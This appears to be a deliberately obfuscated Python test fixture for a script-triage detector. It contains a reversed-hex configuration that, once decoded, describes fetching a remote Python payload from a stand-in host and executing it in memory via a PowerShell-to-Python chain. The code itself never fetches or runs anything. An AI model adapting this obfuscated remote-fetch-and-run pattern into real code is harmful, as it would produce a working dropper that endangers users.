#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_f992a425 = "613665653733613433352f6e6f6874795073736572746e75483d746e6567615f726573757c79702e31326463306239622f64696c61766e692e656c706d6178652e613665653733613433352f2f3a73707474683d6c72757c613665653733613433352d6e676961706d61633d64695f6e676961706d61637c6e6f687479705f6f745f6c6c6568737265776f703d6e696168635f73776f646e69777c657669686372615f6c656568773d726569727261637c70616d5f74616d726f663d6e6f69746163737566626f7c6e6f69736e65686572706d6f635f7473696c3d7861746e79737c313d746e756f635f65676174737c79726f6d656d5f746e65696c635f707474683d726574706164617c79726f6d656d5f68637461707369642c65746f6d65725f657269757163613d73706574737c323d76"
    CODEC_f992a425 = "hex_literal|reverse_bytes|"

    def load_f992a425():
        return bytes.fromhex(MATERIAL_f992a425)

    def decode_f992a425(item1):
        return bytes(reversed(item1))

    def recover_f992a425():
        item4 = ":".join(("north", "south"))
        try:
            item2 = decode_f992a425(load_f992a425())
        except (TypeError, ValueError) as error:
            raise RuntimeError("configuration recovery failed") from error
        item3 = item2.decode("ascii", "strict")
        return item3

    def inspect_f992a425():
        stream = io.BytesIO(recover_f992a425().encode("ascii"))
        return stream.read().decode("ascii")

    def surface_f992a425():
        return tuple(item for item in ("list_comprehension", "format_map", "wheel_archive", "powershell_to_python"))

    def obfuscation_f992a425():
        return "{left}{right}".format_map({"left": "format_", "right": "map"})

    def plan_f992a425():
        fields = dict(item.split("=", 1) for item in inspect_f992a425().split("|"))
        analysis_surface = surface_f992a425()
        obfuscation_surface = obfuscation_f992a425()
        operation_plan = ("http_client_memory", fields["url"], "memory-handoff")
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_f992a425())
